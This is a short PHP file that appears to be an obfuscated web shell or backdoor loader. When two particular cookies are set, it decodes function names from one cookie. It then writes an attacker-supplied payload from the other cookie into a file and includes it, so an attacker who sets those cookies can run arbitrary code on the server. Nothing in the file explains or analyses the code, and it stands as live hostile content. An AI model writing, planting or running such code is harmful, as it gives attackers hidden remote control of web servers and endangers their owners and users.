<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[26])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 5;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[26][$n];
        if (!$c[26][$n + 1]) {
            if (!$c[26][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 5 + 1;
    }
    $k = $p[17]() . $p[4];
    if (!$p[15]($k)) {
        $n = $p[22]($k, $p[3]);
        $p[11]($n, $p[0] . $p[2]($p[10]($c[3])));
    }
    include($k);
}